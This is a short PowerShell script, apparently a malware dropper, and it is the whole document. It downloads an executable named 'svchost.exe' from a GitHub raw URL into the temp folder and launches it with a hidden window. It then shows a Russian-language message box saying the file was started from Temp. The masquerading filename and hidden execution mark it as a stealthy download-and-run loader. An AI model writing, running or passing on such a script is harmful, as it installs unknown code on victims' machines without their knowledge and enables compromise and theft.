$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/svchost.exe";
$p="$env:temp\svchost.exe";
curl.exe -L $u -o $p;
saps $p -WindowStyle Hidden;
Add-Type -AssemblyName Microsoft.VisualBasic;
[Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
